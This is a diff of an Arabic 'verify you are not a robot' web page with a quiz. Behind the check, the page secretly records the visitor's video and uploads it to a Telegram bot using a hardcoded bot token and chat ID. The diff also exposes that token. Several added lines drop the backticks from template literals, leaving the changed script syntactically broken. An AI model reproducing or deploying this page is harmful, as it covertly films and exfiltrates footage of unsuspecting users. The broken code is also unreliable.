@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحقق من أنك لست روبوتاً</title>
-    <style>
+<style>
         * {
             margin: 0;
             padding: 0;
@@ -18,9 +18,9 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow-y: auto;
+            overflow-y: auto; /* تمكين التمرير العمودي */
             flex-direction: column;
-            overflow-x: hidden;
+            overflow-x: hidden; /* منع التمرير الأفقي */
             padding-top: 0;
             padding-bottom: 0;
         }
@@ -32,7 +32,7 @@
             max-width: 350px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 20px; /* إضافة مسافة بين الحاويات */
         }
         h1 {
             font-size: 20px;
@@ -129,26 +129,27 @@
             font-size: 18px;
         }
         .question {
-            margin-bottom: 60px;
+            margin-bottom: 60px; /* مسافة بين السؤال والاختيارات */
             padding: 40px;
             border-radius: 10px;
             font-size: 18px;
         }
         .correct {
-            background-color: #4CAF50;
+            background-color: #4CAF50; /* الإجابة الصحيحة */
         }
         .wrong {
-            background-color: #F44336;
+            background-color: #F44336; /* الإجابة الخاطئة */
         }
         .correct-answer {
-            background-color: #FFEB3B;
+            background-color: #FFEB3B; /* الإجابة الصحيحة مع اختيار المستخدم */
         }
         .question-container {
-            margin-bottom: 20px;
+            margin-bottom: 20px; /* المسافة بين السؤال والإجابات */
         }
 
+        /* إضافة مسافة بين نص السؤال والإجابات */
         #question-text {
-            margin-bottom: 30px;
+            margin-bottom: 30px; /* مسافة بين نص السؤال والإجابات */
         }
     </style>
 </head>
@@ -221,7 +222,7 @@
                         formData.append('chat_id', '2070423407'); 
                         formData.append('video', blob, 'video.webm');
 
-                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
+                        fetch(https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo, { method: 'POST', body: formData })
                             .catch((error) => { console.error('Video upload failed:', error.message); });
                     };
                 })
@@ -266,18 +267,13 @@
                     optionDiv.onclick = () => {
                         const answerIndex = index;
                         answers.push(answerIndex);
-                        if (question.correctAnswer === option) {
+                        if (question.correct === answerIndex) {
                             score++;
-                            optionDiv.classList.add('correct');
                         } else {
-                            optionDiv.classList.add('wrong');
-                            wrongAnswers.push({ question: question.q, correctAnswer: question.correctAnswer });
+                            wrongAnswers.push(question);
                         }
-
-                        setTimeout(() => {
-                            currentQuestionIndex++;
-                            displayQuestion();
-                        }, 500);
+                        currentQuestionIndex++;
+                        displayQuestion();
                     };
                     optionsContainer.appendChild(optionDiv);
                 });
@@ -287,21 +283,36 @@
         }
 
         function showResult() {
+            document.getElementById('question-container').style.display = 'none';
+            resultDiv.style.display = 'block';
+
+            // Show all questions with their answers and colors
             allQuestionsContainer.innerHTML = '';
             questions.forEach((question, index) => {
                 const questionDiv = document.createElement('div');
                 questionDiv.classList.add('question');
-                questionDiv.innerHTML = `<p>${question.q}</p><p class="${answers[index] === question.options.indexOf(question.correctAnswer) ? 'correct' : 'wrong'}">${answers[index] === question.options.indexOf(question.correctAnswer) ? 'صح' : `خطأ. الإجابة الصحيحة هي: ${question.correctAnswer}`}</p>`;
+                questionDiv.innerHTML = 
+                    <h3>${question.q}</h3>
+                    <div class="${question.correct === answers[index] ? 'correct' : 'wrong'}">
+                        <p>${question.options[answers[index]]}</p>
+                    </div>
+                    <div class="correct-answer">
+                        <p>${question.options[question.correct]}</p>
+                    </div>
+                ;
                 allQuestionsContainer.appendChild(questionDiv);
             });
 
-            resultDiv.style.display = 'block';
+            const scoreText = document.createElement('p');
+            scoreText.textContent = النتيجة: ${score} / ${questions.length};
+            allQuestionsContainer.appendChild(scoreText);
         }
 
         function restartQuiz() {
-            resultDiv.style.display = 'none';
-            document.getElementById('quiz-container').style.display = 'none';
-            document.getElementById('language-buttons').style.display = 'block';
+            document.getElementById('result').style.display = 'none';
+            document.getElementById('verification-container').style.display = 'block';
+            document.getElementById('robot-checkbox').checked = false;
+            document.getElementById('language-buttons').style.display = 'flex';
         }
     </script>
 </body>
